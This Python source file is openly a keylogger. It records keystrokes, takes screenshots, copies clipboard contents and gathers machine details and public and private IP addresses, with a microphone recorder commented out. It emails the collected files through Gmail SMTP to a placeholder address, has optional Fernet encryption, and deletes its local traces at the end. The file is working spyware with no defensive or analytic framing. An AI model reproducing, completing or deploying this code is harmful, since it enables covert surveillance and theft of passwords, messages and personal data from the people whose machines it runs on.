#Libraries  For Email

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

#For Computer info
import socket
import platform

#Copying
import win32clipboard

from pynput.keyboard import Key, Listener

#Common imports
import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

#Keylogger creation segment

keys_information = 'key_log.txt'
system_information ='systeminfo.txt'
email_address = 'Email to login'
clipboard_information = 'clipboard.txt'
password = 'ineert Pass'
audio_information = "audio.wav"
microphone_time = 10
screenshott = 'screenshot.png'
time_iteration = 20 #seconds
number_of_iterations_end = 5

keys_information_e = 'e_key_log.txt'
system_information_e = 'esystem_information.txt'
clipboard_information_e = 'e_clipboard.txt'

#key = 'For Encryption Part'

toaddr = 'Insert Email'

username = getpass.getuser()


file_path = 'C:\\Users\\ebby2\\pyt\\Hacking\\Project'
extend = '\\'
file_merge = file_path + extend

#Information collecting and sending of emails

def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    
    #to help send emails over port
    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = 'KeyLog'

    body = 'body'

    msg.attach(MIMEText(body, 'plain'))

    filename = filename

    #read binary of attachment/path of file
    attachment = open(attachment, 'rb')


    p = MIMEBase('application', 'octet-stream')

    #encode the payload
    p.set_payload((attachment).read())

    #Encoding for encryption
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', 'attachment; filename= %s' % filename)

    msg.attach(p)

    
    #Create session to send mail
    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

def computer_information():
    with open(file_path + extend + system_information, 'w') as f:
        hostnamee = socket.gethostname()
        #get private ip by the hostname
        IPAddr = socket.gethostbyname(hostnamee)
        try:
            public_ip = get('https://api.ipify.org').text
            f.write("Public IP: " + public_ip + "\n")
        except Exception:
            f.write("Couldnt get public IP")

        f.write('Processor: ' + (platform.processor()) + '\n')
        f.write('System: ' + platform.system() + ' '+ platform.version() + '\n')
        f.write('Machine: ' + platform.machine() + '\n')
        f.write('Hostname: ' + hostnamee + '\n')
        f.write('Private IP: ' + IPAddr + '\n') 

def copy_clipboard():
    with open(file_path + extend + clipboard_information, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied")

def microphone():
    fs = 44100 #Frames/freq
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)

def screenshot():
    im =ImageGrab.grab()
    im.save(file_path + extend + screenshott)


number_of_iterations = 0
currentTime = time.time()
stoppingTim = time.time() + time_iteration



screenshot()
computer_information()
copy_clipboard()
#microphone()

while number_of_iterations < number_of_iterations_end:
    counts = 0
    count = 0
    keys= []

    #Function for getting key and adding it to the list
    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()
    #Add keys to the log file
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    #append keys to fikle
    def write_file(keys):
        with open(file_path + extend + keys_information, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write(' ')
                    f.close
                elif k.find("enter") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    #IF escape key is hit exit
    def on_release(key):
        #For testing purposes
        if key == Key.esc:
            return False
        if currentTime > stoppingTim:
            return False
        
    #Listen for each key
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


        screenshot()
        send_email(screenshott, file_path + extend + screenshott, toaddr)
        copy_clipboard()

        number_of_iterations += 1 

        currentTime = time.time()
        stoppingTim = time.time() + time_iteration
        time.sleep(5)
    files_to_encrypt = [file_merge + system_information,  file_merge + clipboard_information, file_merge + keys_information]

    for files in files_to_encrypt:
        send_email(files_to_encrypt[counts], files_to_encrypt[counts], toaddr)
        counts += 1
    if currentTime > stoppingTim:
        with open(file_path + extend + keys_information, 'w') as f:
            f.write(" ")
#Encryption
'''
files_to_encrypt = [file_merge + system_information,  file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e,  file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1
'''
time.sleep(5)
delete_files = [system_information, clipboard_information, keys_information, screenshott]
for files in delete_files:
    os.remove(file_merge + files)
